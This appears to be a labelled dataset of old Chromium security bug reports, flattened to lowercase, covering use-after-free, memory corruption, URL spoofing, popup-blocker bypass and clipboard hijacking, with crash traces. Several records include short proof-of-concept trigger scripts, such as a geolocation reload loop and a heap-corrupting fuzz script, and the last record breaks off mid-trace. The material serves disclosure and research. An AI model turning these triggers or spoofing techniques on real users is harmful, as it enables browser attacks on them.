external-report windows kernel crash on invalid font the following was reported to security the attachment has the entire report including example files that were used to cause the crash hi when testing my otf fuzzer i observed the attached crash case which repeatedly loads an otf font exploitable says it is exploitable reproducer and windbg/exploitable report are attached the test machine has xp sp3 installed and is fully patched the font related windows xp hotfix kb979559 was also installed first chance exception type status_access_violation exception sub-type write access violation 20 exception hash major/minor 20 stack trace chrome_1c30000 omx_deinit chrome_1c30000 omx_deinit chrome_1c30000 chromemain chrome_1c30000 chromemain chrome_1c30000 chromemain chrome_1c30000 chromemain chrome_1c30000 hunspell_create_key chrome_1c30000 chromemain chrome_1c30000 hunspell_create_key chrome_1c30000 chromemain chrome_1c30000 chromemain chrome_1c30000 chromemain chrome_1c30000 chromemain chrome_1c30000 chromemain chrome_1c30000 chromemain chrome_1c30000 chromemain chrome_1c30000 chromemain chrome_1c30000 chromemain chrome_1c30000 chromemain chrome_1c30000 chromemain chrome_1c30000 chromemain chrome_1c30000 chromemain chrome_1c30000 chromemain chrome_1c30000 chromemain chrome_1c30000 chromemain chrome_1c30000 hunspell_create_key chrome_1c30000 hunspell_create_key chrome_1c30000 hunspell_create_key chrome_1c30000 hunspell_create_key chrome_1c30000 hunspell_create_key chrome_1c30000 hunspell_create_key chrome_1c30000 chromemain chrome setextensionid chrome setextensionid chrome setextensionid kernel32 registerwaitforinputidle instruction address 20 description user mode write av short description writeav exploitability classification exploitable recommended bug title exploitable user mode write av starting at chr ome_1c30000 omx_deinit hash 20 user mode write access violations that are not near null are exploitabl e kind regards marc sch=f6nefeld	11
crash in third_party xdg_mime library when unable to handle long file paths hi again uname a linux berlin 2.6.32-22-generic 36-ubuntu smp thu jun 3 22:02:19 utc 2010 i686 gnu/linux firefox ok chrome 5.0.375.99 latest segmentation fault completely crashes with no sad face under windows get an aw snap screen with sad face this may be the sick function xdg_glob_hash_lookup_file_name base/third_party/xdg_mime/xdgmimeglob.c it appears a quick fix was applied a couple of weeks ago also i could n't figure out how a regular exp like this could be useful fnmatch pattern anim 1-9j string foo a repeats 196 times flags=0 at fnmatch.c the following html will cause the crash html head script language javascript function go var str aaaaaa var finalstr craploadofaa str 400000 makeembed finalstr function craploadofaa str num var i math.ceil math.log num math.ln2 res str do res res while 0 i return res.slice 0 str.length num function makeembed str browser segs ifrm document.createelement embed ifrm.setattribute type ifrm.setattribute src www str document.body.appendchild ifrm just an aw snap ifrm document.createelement iframe ifrm.setattribute src str document.body.appendchild ifrm script head body p a href onmousedown go punch it a p body html i have attached the crash info lsatchel	11
memory corruption read random system memory or crash it is possible to crash browser or read some memory using special page check details in attach html file js and instructions in it thanks a lot 4.1.249.1064 45376 windows xp 32 bit sp3	11
chrome_1c30000 skalpharuns break memory corruption chrome version google chrome 4.1.249.1064 webkit 532.5 v8 1.3.18.22 urls if applicable attached test file poc.htm to reproduce issue other browsers tested ie8 ff 3.5 safari 4 add ok or fail after other browsers where you have tested this issue safari 4 ok firefox 3.6.3 ok ie 7 ie 8 what steps will reproduce the problem 1 open the attached html file with chrome what is the expected result the memory use should stay stable the google child proccess should n't crash what happens instead usage cpu 50 crash of child proccess or process never ends please provide any additional information below attach a screenshot if possible more.dmp crash dump info.txt more informations about problem	11
memory corruption with crash in renderobject containingblock i found a new bug probably different to previous reports because i deleted of my fuzzer keygen html tag border-radius and their variants and counter-increment etc you know other issues i had problems to reproduce the issue and i did n't reduce it i will try it with next comments i ve attached two different stacktraces and files logs from my fuzzer steps to reproduce strange i know first method long and more likely 1 open browser tested on google chrome 5.0.375.86 2 add to browser the file fuzz-11 3 add to browser the file fuzz-10 4 add to browser the file fuzz-9 5 add to browser the file fuzz-x 6 finally add to browser the file fuzz-3 and crash second method short and less likely i ve reduced the root cause to files fuzz-7 and fuzz-3 1 open browser tested on google chrome 5.0.375.86 3 add to browser the file fuzz-7 4 add to browser the file fuzz-3 5 repeat 3 and 4 steps until crash maybe this second method does n't crash the browser so try it again fuzz-7 fuzz-3 fuzz-7 fuzz-3 fuzz-7 fuzz-3 in summary issue are fuzz-7 and fuzz-3 i will try to reduce the problem in future comments final note i ve already tested on 6.0.447.0 dev and it works second method	11
use on font-face causes crashes if svguseelement gets detached a renderer segmentation fault is triggered by an svg document with the content svg xmlns xmlns xlink font-face id foo use xlink href foo crash the error affects at least chromium 6.0.453.0 developer build 51332 in ubuntu 10.04 x64 and x86_64 and seems to cause an occasional segmentation fault when the browser is closed in current google chrome backtrace begins program received signal sigsegv segmentation fault webcore containernode removedfromdocument this at third_party/webkit/webcore/dom/containernode.cpp:658 658 third_party/webkit/webcore/dom/containernode.cpp no such file or directory in third_party/webkit/webcore/dom/containernode.cpp gdb bt 0 webcore containernode removedfromdocument this at third_party/webkit/webcore/dom/containernode.cpp:658 1 in webcore private noderemovaldispatcher webcore node true dispatch head tail container at third_party/webkit/webcore/dom/containernodealgorithms.h:99 2 webcore private addchildnodestodeletionqueue webcore node webcore containernode head tail container at third_party/webkit/webcore/dom/containernodealgorithms.h:139 3 in removeallchildrenincontainer webcore node webcore containernode this at third_party/webkit/webcore/dom/containernodealgorithms.h:47 4 webcore containernode removeallchildren this at third_party/webkit/webcore/dom/containernode.cpp:72 5 in containernode this in_chrg value optimized out at third_party/webkit/webcore/dom/containernode.cpp:77 6 in svgshadowtreerootelement this in_chrg value optimized out vtt_parm value optimized out at third_party/webkit/webcore/rendering/svgshadowtreeelements.cpp:57 7 in derefifnotnull webcore svgshadowtreerootelement this in_chrg value optimized out at third_party/webkit/javascriptcore/wtf/passrefptr.h:66 8 refptr this in_chrg value optimized out the original non-minimized file triggered a segfault at webcore renderobjectchildlist insertchildnode this owner child beforechild fullinsert=true it is probably just causing a different manifestation of the same bug but i can be add it here if needed	11
incorrect eliding windows truncation linux for hostname in security information dialog steps to reproduce i tried on chromium 6.0.461.0 51844 for windows vista and chromium 6.0.459.0 51696 for ubuntu 10 1 go to 2 click on the globe icon on left of url to open the security information dialog 3 see url incorrectly elided for windows and truncation of hostname on lineend for linux expected behavior is the hostname should line wrap properly to the next line this happens properly on the mac	9
security issue in svguseelement buildshadowtree hi these two i sent them to zdi severval months ago but zdi refused so i sent them to google i tested it works on newest chrome stable version wushi	11
memory corruption with invalid text node cast for edit commands split off from bug 49596 from wooshi here src is arbitary so looks like oob read memcpy unsigned char dst unsigned char src unsigned long count=2 line 358 asm webcore stringimpl create const wchar_t characters unsigned int length=1 line 97 bytes c webcore stringimpl substring unsigned int start=0 unsigned int length=1 line 174 bytes c webcore characterdata substringdata unsigned int offset=0 unsigned int count=1 int ec=0 line 59 bytes c webcore deletefromtextnodecommand doapply line 52 bytes c webcore editcommand apply line 91 bytes c webcore compositeeditcommand applycommandtocomposite wtf passrefptr webcore editcommand cmd m_document m_styleselector m_didcalculatestyleselector=false m_frame m_startingselection m_endingselection line 100 c webcore compositeeditcommand replacetextinnode wtf passrefptr webcore text node unsigned int offset=0 unsigned int count=1 const webcore string replacementtext lle line 334 bytes c webcore deleteselectioncommand fixupwhitespace line 550 c webcore deleteselectioncommand doapply line 790 c webcore editcommand apply line 91 bytes c webcore compositeeditcommand applycommandtocomposite wtf passrefptr webcore editcommand cmd m_document m_styleselector m_didcalculatestyleselector=false m_frame m_startingselection m_endingselection line 100 c webcore compositeeditcommand deleteselection const webcore visibleselection selection bool smartdelete=false bool mergeblocksafterdelete=true bool replace=false bool expandforspecialelements=true line 370 bytes c webcore typingcommand deletekeypressed webcore textgranularity granularity=charactergranularity bool killring=false line 506 c webcore typingcommand doapply line 260 c webcore editcommand apply line 91 bytes c webcore typingcommand deletekeypressed webcore document document bool smartdelete=false webcore textgranularity granularity=charactergranularity bool killring=false line 101 c webcore executedelete webcore frame frame webcore event formal webcore editorcommandsource source=commandfromdom webcore event formal line 320 bytes c webcore editor command execute const webcore string parameter webcore event triggeringevent line 1554 bytes c webcore document execcommand const webcore string commandname delete bool userinterface=false const webcore string value line 3706 bytes c webcore documentinternal execcommandcallback const v8 arguments args line 1400 bytes c v8 internal handleapicallhelper 0 v8 internal anonymous-namespace builtinarguments 1 args line 972 bytes c v8 internal builtin_impl_handleapicall v8 internal anonymous-namespace builtinarguments 1 args line 989 bytes c v8 internal builtin_handleapicall v8 internal anonymous-namespace builtinarguments 1 args line 988 bytes c 033800ae v8 internal invoke bool construct=false v8 internal handle v8 internal jsfunction func v8 internal handle v8 internal object receiver int argc=0 v8 internal object args bool has_pending_exception line 95 bytes c v8 internal execution call v8 internal handle v8 internal jsfunction func v8 internal handle v8 internal object receiver int argc=0 v8 internal object args bool pending_exception line 121 bytes c v8 script run line 1246 bytes c webcore v8proxy runscript v8 handle v8 script script bool isinlinecode=false line 457 bytes c webcore v8proxy evaluate const webcore scriptsourcecode source webcore node node line 408 bytes c webcore scriptcontroller evaluate const webcore scriptsourcecode sourcecode webcore shouldallowxss shouldallowxss=donotallowxss line 241 c webcore scriptcontroller executescript const webcore scriptsourcecode sourcecode webcore shouldallowxss shouldallowxss=donotallowxss line 62 c webcore xmldocumentparser endelementns line 873 bytes c webcore endelementnshandler void closure const unsigned char formal const unsigned char formal const unsigned char formal line 1086 c xmlparseendtag2 xmlparserctxt ctxt const unsigned char prefix const unsigned char uri int line=0 int nsnr=0 int tlen=0 line 9222 bytes c xmlparsetryorfinish xmlparserctxt ctxt int terminate=0 line 11027 bytes c xmlparsechunk xmlparserctxt ctxt const char chunk int size=9946 int terminate=0 line 11632 bytes c webcore xmldocumentparser dowrite const webcore string parsestring html xmlns xmlns svg xmlns mat xmlns xht xml-stylesheet href line 643 bytes c webcore xmldocumentparser append const webcore segmentedstring s line 143 bytes c webcore decodeddatadocumentparser appendbytes webcore documentwriter writer const char data int length=4973 bool shouldflush=false line 55 bytes c webcore documentwriter adddata const char str int len=4973 bool flush=false line 200 bytes c webcore frameloader adddata const char bytes int length=4973 line 1144 c webkit webframeimpl commitdocumentdata const char data unsigned int datalen=4973 line 1022 c webkit frameloaderclientimpl committedload webcore documentloader loader const char data int length=4973 line 1042 bytes c webcore frameloader committedload webcore documentloader loader const char data int length=4973 line 2752 bytes c webcore documentloader commitload const char data int length=4973 line 281 c webcore documentloader receiveddata const char data int length=4973 line 293 c webcore frameloader receiveddata const char data int length=4973 line 1558 c webcore mainresourceloader adddata const char data int length=4973 bool allatonce=false line 148 c webcore resourceloader didreceivedata const char data int length=4973 int64 lengthreceived=4973 bool allatonce=false line 260 bytes c webcore mainresourceloader didreceivedata const char data int length=4973 int64 lengthreceived=4973 bool allatonce=false line 416 c webcore resourceloader didreceivedata webcore resourcehandle formal const char data int length=4973 int lengthreceived=4973 line 431 bytes c webcore resourcehandleinternal didreceivedata webkit weburlloader formal const char data int datalength=4973 line 173 bytes c webkit_glue weburlloaderimpl context onreceiveddata const char data int len=4973 line 564 bytes c resourcedispatcher onreceiveddata const ipc message message=class=16 index=53 int request_id=27 void shm_handle int data_len=4973 line 397 bytes c ipc messagewithtuple tuple3 int void int dispatch resourcedispatcher int void int const ipc message msg=class=16 index=53 resourcedispatcher obj void const ipc message int void int func line 1079 bytes c resourcedispatcher dispatchmessagew const ipc message message=class=16 index=53 line 535 bytes c resourcedispatcher onmessagereceived const ipc message message=class=16 index=53 line 303 c childthread onmessagereceived const ipc message msg=class=16 index=53 line 124 bytes c ipc channelproxy context ondispatchmessage const ipc message message=class=16 index=53 line 206 bytes c dispatchtomethod ipc channelproxy context void thiscall ipc channelproxy context ipc message const ipc message ipc channelproxy context obj void const ipc message method const tuple1 ipc message arg line 422 bytes c runnablemethod ipc channelproxy context void thiscall ipc channelproxy context ipc message const tuple1 ipc message run line 326 bytes c messageloop runtask task task line 409 bytes c messageloop deferorrunpendingtask const messageloop pendingtask pending_task line 421 c messageloop dowork line 525 bytes c base messagepumpforui dorunloop line 203 bytes c base messagepumpwin runwithdispatcher base messagepump delegate delegate base messagepumpwin dispatcher dispatcher line 52 bytes c base messagepumpwin run base messagepump delegate delegate line 79 bytes c messageloop runinternal line 257 bytes c messageloop runhandler line 230 c messageloop run line 208 c base thread run messageloop message_loop line 137 c base thread threadmain line 160 bytes c anonymous namespace threadfunc void closure line 26 bytes c kernel32.dll basethreadinitthunk 12 bytes ntdll.dll rtluserthreadstart 8 bytes ntdll.dll rtluserthreadstart 8 bytes	11
security window.history.replacestate fails to enforce domain security the html5 spec states as part of the algorithm for window.history.replacestate compare the resulting absolute url to the document s address if any part of these two urls differ other than the path query and fragment components then raise a security_err exception and abort these steps in fact chromium follows this throwing the following error error security_err dom exception 18 however if the page has a base tag with an href set to any arbitrary domain window.history.replacestate is allowed to change document.location to that arbitary domain and is updated in the url bar the attached usecase should make it obvious why this is a huge security bug you can spoof any site including the url i can reproduce this in chromium/mac 6.0.469.0 52652 as well as chrome/mac 6.0.466.4 dev and chrome/mac 5.0.375.99 stable steps to reproduce 1 open fakelogin.html either locally or at 2 observe url or document.location 3 click the apply hacks button in the top bar 4 observe the url changing to gmail s login path including base domain 5 enter your gmail login information and get pwned do n't really do this p it should be noted that this is not possible in the builds of gecko that support window.history.replacestate so chromium/chrome is the only one vulnerable here	11
crash when closing chrome balloonviewimpl delayedclose chrome version 6.0.472.0 official build 53024 dev what steps will reproduce the problem 1 close chrome what is the expected result it should not crash what happens instead it crash please provide any additional information below attach a screenshot if possible crash id 14d45f6a91589d25	11
plain-text information leak of due to autosuggest robert hansen s recent blackhat talk noted a relatively minor leak due to chrome s autosuggest functionality it was not widely picked up perhaps due to being buried amongst lots of other https info during the talk it turns out that if you type the following into the url bar then autosuggest queries will be issued over plain http up to and including the character this obviously leaks both username and password normally autosuggest for https stops at the end of the hostname to protect path and url parameters hostname is fundamentally leaked due to dns we could trivially stop at the to avoid leaking the password ideally we might never leak the username either best i can come up with is to delay requesting suggestions until we see a in the hostname e.g 1 https stop requesting suggestions 2a restart requesting suggestions at this moment 2b do not restart requesting suggestions for any variation of this prefix 2c do not restart requesting suggestions for any variation of this prefix not sure if this solution is acceptable anyone know who the eng owner is for autosuggest	6
memory corruption with moving ruby text nodes to runs without ruby bases 1.htm script function crash document.getelementsbytagname body 0 outerhtml=1 script body onload='crash ruby fieldset ruby rt rt blockquote body body blockquote rt rt body chromium 6.0.490.0 55524	11
security webkit webcore geolocationservice positionchanged use after free index.htm meta http-equiv refresh content 0 url=index.htm iframe src k.htm width 800 height 600 iframe k.htm script window.navigator.geolocation.getcurrentposition window.captureevents window.navigator.geolocation.getcurrentposition null setinterval location.reload 1 script put index.htm 127.0.0.1 then viste crash	11
regression m7 chrome popup blocker bypass os windows xp chrome 4.0.249.78 testcase inspiration chris s bug on escaping iframe sandbox attribute description using a combination of form submit inside iframe with target window blank can provide an evil site enough control to open any number of tab inside chrome without any user interaction chris s bug is targeted for milestone 5 however seeing the possibility of using similar exploit for bypassing popup blocking i think should be patched in v4 also another possibility which i have n't explored is possible injection to manipulate your most visited sites since it looks to depend on website value in different tabs	9
omnibox visual spoofing with japanese maru test cases are attached and also available at tested in chromium to reproduce add japanese to your list of languages in the browser s configuration issue the maru character is rendering as empty white space in omnibox the following url s appear to be www.yahoo.com the maru character u+3099 combining katakana-hiragana voiced sound mark is being stacked to create the effect of empty white space pushing the true domain name off the right hand side of the omnibox where it s no longer visible depending on the width of the user s screen resolution and omnibox note i tried some ways to push the true domain name out further but seemed to reach a limit with what the number of maru characters which omnibox would allow the third link below demonstrates this limit i m guessing that by playing with this further i could find some combination that would push the domain out beyond the width	9
security permanent clipboard hijack from testcase usually system clipboard access is restricted in clipboard events like oncopy and onpaste however i found that you can set the system clipboard in any context e.g a timer event this can be achieved by adding an iframe containing a text input element into the document and turning its design-mode content-editable on the execcommand will then become available via the added iframe document so to copy text to the system clipboard you set the text input s value in the iframe to the text to be copied then you select and focus the text input control and finally issue a execcommand copy on the iframe i have attached a demo this has an example with malicious intent where it hijacks the system clipboard by constantly setting its content to a malicious url extra efforts can be made to avoid scrolling issues when focusing/selection the text input by using absolute floats i m not sure if you would consider this a security hole or not i have tested it on safari 3 windows and mac and chrome 2 in which it works	2
stale pointer in svgresourcefilter note this was mined from crash reports 2:020 g de8.f48 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=40800301 ebx=00ce3da0 ecx=00000310 edx=00000000 esi=0012ede8 edi=0012edf8 eip=01d7ca27 esp=0012eda8 ebp=0012ee0c iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 chrome_1c30000 webcore bitmapimagesingleframeskia draw 01d7ca27 ff30 push dword ptr eax ds:0023:40800301 1:002 kv childebp retaddr args to child 0012ee0c 01cf4f3c 00ce1810 0012ee34 0012ee44 chrome_1c30000 webcore bitmapimagesingleframeskia draw conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\platform\graphics\skia\imageskia.cpp 454 0012ee6c 01d9b074 00ce1810 00000000 44c12000 chrome_1c30000 webcore graphicscontext drawimage conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\platform\graphics\graphicscontext.cpp 410 0012eed0 01d9497e 00c65a10 0012ef40 0103e37c chrome_1c30000 webcore svgresourcefilter applyfilter conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\svg\graphics\svgresourcefilter.cpp 188 0012eee4 01da1141 00ce1810 00000000 0103e37c chrome_1c30000 webcore svgrenderbase finishrendersvgcontent fpo 1,0,1 conv cdecl c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\svgrendersupport.cpp 172 0012ef6c 01da1120 0012efd0 00000000 00000000 chrome_1c30000 webcore rendersvgcontainer paint conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\rendersvgcontainer.cpp 112 0012effc 01da1120 0012f060 00000000 00000000 chrome_1c30000 webcore rendersvgcontainer paint conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\rendersvgcontainer.cpp 108 0012f08c 01da1120 0012f0f0 00000000 00000000 chrome_1c30000 webcore rendersvgcontainer paint conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\rendersvgcontainer.cpp 108 0012f11c 01da1120 0012f180 00000000 00000000 chrome_1c30000 webcore rendersvgcontainer paint conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\rendersvgcontainer.cpp 108 0012f1ac 01d38059 0012f1d0 00000000 00000000 chrome_1c30000 webcore rendersvgcontainer paint conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\rendersvgcontainer.cpp 108 0012f1fc 01d96a21 0012f230 00000000 00000000 chrome_1c30000 webcore renderbox paint conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\renderbox.cpp 574 0012f2bc 01cecd03 0012f320 00000000 00000000 chrome_1c30000 webcore rendersvgroot paint conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\rendersvgroot.cpp 179 0012f46c 01cece3a 00c7e2e8 0012f780 0012f6e0 chrome_1c30000 webcore renderlayer paintlayer conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\renderlayer.cpp 2393 0012f62c 01cec5b6 00c7e2e8 0012f780 0012f6e0 chrome_1c30000 webcore renderlayer paintlayer conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\renderlayer.cpp 2416 0012f678 01cf3caa 0012f780 0012f6e0 00000000 chrome_1c30000 webcore renderlayer paint conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\renderlayer.cpp 2196 0012f6a8 01c84d26 0012f780 0012f6e0 0012f750 chrome_1c30000 webcore frameview paintcontents conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\page\frameview.cpp 1829 0012f710 01e8ce27 0012f780 0012f740 0012f788 chrome_1c30000 webcore scrollview paint conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webcore\platform\scrollview.cpp 817 0012f760 01e8cea9 00c675a0 0012f780 00000000 chrome_1c30000 webkit webframeimpl paintwithcontext conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webkit\chromium\src\webframeimpl.cpp 1782 0012f7d0 01e92e03 00c675a0 00c3d8c0 0012f838 chrome_1c30000 webkit webframeimpl paint conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webkit\chromium\src\webframeimpl.cpp 1804 0012f7e0 020131ad 00c3d8c0 0012f838 00000000 chrome_1c30000 webkit webviewimpl paint fpo 2,0,0 conv thiscall c b\slave\chrome-official\build\src\third_party\webkit\webkit\chromium\src\webviewimpl.cpp 964 0012f84c 020134ce 00c83400 00c3a630 00000000 chrome_1c30000 renderwidget paintrect conv thiscall c b\slave\chrome-official\build\src\chrome\renderer\render_widget.cc 390 1:002 lmv m chrome start end module name 00400000 004ea000 chrome deferred image path chrome.exe image name chrome.exe timestamp thu may 20 19:26:51 2010 4bf570db checksum 000e88f7 imagesize 000ea000 file version 0.0.0.0 product version 0.0.0.0 file flags 0 mask 17 file os 4 unknown win32 file type 1.0 app file date 00000000.00000000 translations 0409.04b0 companyname google inc productname google chrome internalname chrome_exe originalfilename chrome.exe productversion 0.0.0.0 fileversion 0.0.0.0 filedescription google chrome legalcopyright copyright c 2006-2009 google inc all rights reserved	11
web pages should not be able to load resources if there are no content scripts from that extension on the page we allow web pages to load resources from extensions as a feature to content scripts however if we know that an extension does not have any content scripts on a page then we should not allow resources to be loaded from that extension for background see bug 45521	2
browser crash in websocket creation the repro for issue 37190 triggers a null deref crash in the browser the relevant stack is below chrome.dll net proxyserver proxyserver const net proxyserver that bytes c chrome.dll net proxyinfo proxy_server line 74 bytes c chrome.dll net socketstream doresolvehost line 466 bytes c chrome.dll net socketstream doloop int result=0 line 357 bytes c chrome.dll dispatchtomethod net socketstream void thiscall net socketstream int enum net error net socketstream obj void int method const tuple1 enum net error arg line 422 bytes c chrome.dll runnablemethod net socketstream void thiscall net socketstream int tuple1 enum net error run line 323 bytes c	11
null deref when socket stream is closed during hostname resolution this is a followup to the browser crashing part of issue 51630 reproduction case attached as crash.html crash.py	11
security webkit 43295 cross_fuzz notification requestpermission memory corruption this is a variation of issue 28811 it was found by crossfuzz my port of michal zalewski s cross_fuzz script function go var target_window window.open about blank var notification target_window.webkitnotifications target_window.location.reload setinterval function heap_corrupt notification.requestpermission 1 function heap_corrupt var a for var i 0 i i try if i a.push new webglbytearray math.pow 2 i a.push new webglbytearray catch e a.push array i join a delete a try gc catch e go script it causes the code in webcore v8notificationcenter requestpermissioncallback to reuse freed memory stack webcore v8notificationcenter requestpermissioncallback v8 internal handleapicallhelper v8 internal builtin_handleapicall v8 internal invoke v8 internal execution call l87 upstream safari does not seem to implement webkit notifications yet	11
memory corruption in websocketchannel skipbuffer underflow in buffer size this may be related to issue 51536 chromium 6.0.490.0 on mac os 10.6.4 when chromium receives a string of xff 5 or more from a websocket server after completing a handshake the tab immediately crashes there are variations of this string with other characters mixed in that also cause an immediate tab crash i ve even seen the entire browser crash segfault at as a result of repeatedly crashing tabs with fuzzed websocket data although this is hard to reproduce i have a mac os crash report if it s useful to reproduce run the attached websocket.py python server while loading the attached websocket.html in chromium note that this will probably not work with the current release of chrome as it uses an older version of the websocket protocol	11
numerous integer wraps and errant pointers within websockets parser i will continue adding to this bug as i audit more of this code websocketchannel processbuffer 271 length should be size_t when length reaches a negative value lots of checks fail websocketchannel processbuffer 273 this checks that the multiplication on line 284 will not wrap but does not account for the addition in the same line websocketchannel processbuffer 275 in the case that length will wrap we perform a memmove based on the previous length which is guaranteed to be at minimum 33mb this should probably never work websocketchannel processbuffer 284 length can wrap to negative or all the way websocketchannel processbuffer 289 when length is negative this block will be entered and in skipbuffer we will perform a memmove when length can be arbitrarily controlled websocketchannel appendtobuffer 204 integer wrap in the allocation this would allocate a smaller buffer and then copy a larger amount of data into in on line 206-207 websocketchannel skipbuffer 220 this was reported here but listing it here for completeness most of this can be fixed by using size_t for lengths throughout and adding a few sanity checks for wraps	11
memory corruption in counter nodes see 1.htm	9
autocomplete entries submitted by javascript should not be stored in db similar to autofill bug 48225 subject says it all we dont want auto submitted javascript to submit spam entries in a form field that was fixed for autofill bug 48225 but i still see it in autocomplete entries while we do restrict no of entries per autocomplete field we should n't be storing any one at all since it can kick off legitimate entries	11
google chrome focus handling use-after-free vulnerability external report received via security google.com trax id:680724394 from chaouki bekrar bekrar vupen.com to security google.com date aug 8/17/2010 8:43 we discovered a critical vulnerability in google chrome versions 5.x this flaw is caused by a use-after-free error in the way the browser handles element focus which may potentially lead to arbitrary code execution or an unexpected browser termination proof-of-concept attached credit must go to vupen vulnerability research team vupen-sr-2010-249 we look forward to working with you on coordinating this flaw	7
sandbox ipc out-of-bounds write in crosscallparamsex createfrombuffer it is a variation of bug 32915 which we overlooked at that time credits to adobe s security team for the find in crosscall_server.cc crosscallparamsex createfrombuffer getactualbuffersize param_count buffer_base returns an untrusted value which we check to be not too big and not zero but it can be set to a small value this causes problems because we overlay via placement new an object of type crosscallparamsex on memory of a size that can be smaller than sizeof crosscallparamsex then 1 the default ctor of crosscallparamsex will write zeros outside the allocated memory corrupting nearby heap allocation in all likelihood the set of tests in the following loop fail and cause the early exit for size_t ix 0 ix param_count ix address copied_params getrawparameter if address address malformed return null the belief here is based on the fact that getrawparameter now points to random memory on the heap that is not directly attacker controlled so whatever this memory is needs to 1 make some sense and 2 be useful for an attack seems hard but we have seem crazy feats in particular the heap might contain previous ipc values	11
security ability to read cross domain image data using todataurl and getimagedata via createpattern while converting some layouttests and adding my own modifications i came across a bug in how chrome handles 3rd party images loaded from a same origin page that forces a 301 redirect by calling createpattern on the redirected image it appears chrome either disregards the origin-clean flag or some how it gets reset once createpattern is called on the 2d canvas context i ve created a proof of concept for this bug which you can find here you ll note in the output that drawimage will cause security exceptions yet createpattern does not i ran the test against chrome 6.0.472.41 beta firefox and opera both throw security exceptions also when the image src is set to a 3rd party url directly chrome will throw security exceptions for both drawimage and createpattern thank you isaac	7
fatal assertion failure when getting gdk custom cursor on safari books chrome version from the about version page 6.0.491.0 55592 is this the most recent version yes os version ubuntu 10.04 cpu architecture 32-bit 64-bit 64 bit window manager compiz urls if relevant my.safaribooks.com behavior in linux firefox ok behavior in windows chrome if you have access to it what steps will reproduce the problem 1 login to my.safaribooks 2 click on link to a book 3 move the mouse around what is the expected result i am able to move the mouse around and continue to use chrome what happens instead fatal assertion failure and xmessage popping up with backtrace please provide any additional information below attach a screenshot and backtrace if possible 25422:25422:4343527807 fatal chrome/app/chrome_dll_main.cc 250 gdk gdk_cursor_new_from_pixbuf assertion 0 x x gdk_pixbuf_get_width pixbuf failed backtrace stacktrace stacktrace logging logmessage logmessage anonymous namespace glibloghandler webcursor getcustomcursor renderwidgethostviewgtk showcurrentcursor renderwidgethostviewgtk updatecursor renderwidgethost onmsgsetcursor dispatchtomethod ipc messagewithtuple dispatch renderwidgethost onmessagereceived renderviewhost onmessagereceived browserrenderprocesshost onmessagereceived ipc channelproxy context ondispatchmessage dispatchtomethod runnablemethod run messageloop runtask messageloop deferorrunpendingtask messageloop dowork base messagepumpforui handledispatch anonymous namespace worksourcedispatch base messagepumpforui runwithdispatcher base messagepumpforui run messageloop runinternal messageloop runhandler messageloopforui run anonymous namespace runuimessageloop browsermain chromemain main i have a feeling it might be something to do with redrawing the mouse after mousing over something	9
use after free in console.profile calls chromium 6.0.490.0 55524	11
blockedpopupcontainer getblockedcontents readav null 882a25e76e991e980ffce6adda7cfcc5 open.htm script open setinterval location.reload 1 script tested chromium 6.0.495.0 56149 open test.htm then click the pop blocker untill it comes crash	2
browser crash renderviewhost filesselectedinchooser 1 go to data text/html script w=open data text/html input type file id f script f.click script settimeout w.close 1000 script 2 wait until the file picker dialog appears 3 try to close the dialog call stack chrome.dll renderviewhost filesselectedinchooser const std vector filepath std allocator filepath files 0 line 665 bytes c chrome.dll tabcontents fileselectioncanceled void params line 2846 bytes c chrome.dll selectfiledialogimpl filenotselected void params baseshelldialogimpl runstate run_state line 766 c chrome.dll runnablemethod automationresourcemessagefilter bool thiscall automationresourcemessagefilter int int int tuple3 int int int run line 296 bytes c chrome.dll messageloop runtask task task line 329 c chrome.dll messageloop dowork line 443 bytes c chrome.dll base messagepumpforui dorunloop line 204 c chrome.dll base messagepumpwin runwithdispatcher base messagepump deleg ate delegate base messagepumpwin dispatcher dispatcher line 54 c chrome.dll messageloop runinternal line 199 bytes c chrome.dll messageloopforui run base messagepumpwin dispatcher dispatcher line 612 c chrome.dll anonymous namespace runuimessageloop browserprocess browser_process line 192 c chrome.dll browsermain const mainfunctionparams parameters line 1271 bytes c chrome.dll chromemain hinstance instance sandbox sandboxinterfaceinfo sandbox_info wchar_t command_line line 830 bytes c	11
browser crash in improper destruction of select file dialog mac branched off from bug 45400 since it was a different issue credit serg reproducer steps 1 go to data text/html script w=open data text/html input type file id f script f.click script settimeout w.close 1000 script 2 wait until the file picker dialog appears 3 try to close the dialog it is reproducing as secseverity critical program received signal exc_bad_access could not access memory reason kern_invalid_address at address in objc_msgsend gdb bt 0 in objc_msgsend 1 in 2 in nsnavdatasource displaystatefornode 3 in nsnavbrowserdelegate browser willdisplaycell atrow column 4 in nsbrowser senddelegatewilldisplaycell atrow column 5 in nstableview delegatewilldisplaycell forcolumn row 6 in nstableview preparedcellatcolumn row 7 in nsnavbrowsertableview preparedcellatcolumn row 8 in nstableview dirtyvisiblecellsforkeystatechange 9 in nstableview windowchangedkeystate 10 in cfarrayapplyfunction 11 in nsview windowchangedkeystate 12 in cfarrayapplyfunction 13 in nsview windowchangedkeystate 14 in cfarrayapplyfunction 15 in nsview windowchangedkeystate 16 in cfarrayapplyfunction 17 in nsview windowchangedkeystate 18 in cfarrayapplyfunction 19 in nsview windowchangedkeystate 20 in cfarrayapplyfunction 21 in nsview windowchangedkeystate 22 in nscontrol windowchangedkeystate 23 in nsbrowser 